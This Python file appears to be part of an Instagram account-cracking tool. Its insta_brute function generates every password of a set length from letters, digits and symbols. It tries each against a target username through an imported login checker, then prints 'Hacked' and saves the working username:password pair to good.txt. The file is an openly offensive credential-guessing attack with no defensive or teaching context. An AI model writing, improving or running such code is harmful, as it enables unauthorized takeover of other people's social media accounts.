import instaloader
import typer
import requests
import os
from tabulate import tabulate
import time
from .dict_attack import insta_pass

letters = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 
           'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 
           '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=']
letters.reverse()
def insta_brute(target, pwd_size=8):
    stack = [("", 0)] 

    while stack:
        current, depth = stack.pop()
        if depth == pwd_size:
            username = target
            password = current
            if insta_pass(username, password):
                pass_table = [
                    [typer.style(username, fg=typer.colors.GREEN), typer.style(password, fg=typer.colors.GREEN), typer.style("Hacked. Password is Helper/good.txt", fg=typer.colors.CYAN)]
                ]
                print(tabulate(pass_table, tablefmt="psql"))
                
                with open('good.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
                return True 

            else:
                x_table = [
                    [typer.style(username, fg=typer.colors.GREEN), typer.style(password, fg=typer.colors.GREEN), typer.style("Hacking... Status: False", fg=typer.colors.RED)]
                ]
                print(tabulate(x_table, tablefmt="psql"))
        else:
            for char in letters:
                stack.append((current + char, depth + 1))

    return False

